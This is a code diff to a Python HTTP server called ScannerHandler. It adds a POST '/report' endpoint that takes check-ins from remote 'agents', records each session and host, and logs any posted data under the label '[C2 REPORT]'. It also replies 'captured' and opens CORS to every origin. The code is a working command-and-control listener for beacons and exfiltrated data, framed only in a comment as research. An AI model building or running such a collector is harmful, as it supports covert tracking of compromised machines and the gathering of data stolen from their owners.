@@ -102,11 +102,52 @@ class ScannerHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
+    def do_POST(self):
+        if self.path.startswith('/report'):
+            # Handle activity reporting from agents
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            
+            from urllib.parse import urlparse, parse_qs
+            parsed = urlparse(self.path)
+            params = parse_qs(parsed.query)
+            
+            sid = params.get('sid', [None])[0]
+            host = params.get('host', ['Unknown'])[0]
+            event = params.get('event', ['heartbeat'])[0]
+            
+            try:
+                data = json.loads(post_data) if post_data else {}
+            except:
+                data = {}
+
+            if sid:
+                MONITORED_SESSIONS[sid] = {
+                    "sid": sid,
+                    "host": host,
+                    "last_seen": time.time(),
+                    "time_str": datetime.now().strftime("%H:%M:%S")
+                }
+                
+                # Log activity to console for research visibility
+                print(f"[C2 REPORT] {datetime.now().strftime('%H:%M:%S')} | Host: {host} | SID: {sid} | Event: {event}")
+                if data:
+                    print(f"   - Data: {json.dumps(data)}")
+
+            self.send_response(200)
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "captured"}).encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
     def do_OPTIONS(self):
         self.send_response(200)
         self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'X-Requested-With')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With')
         self.end_headers()
 
 def run_server():
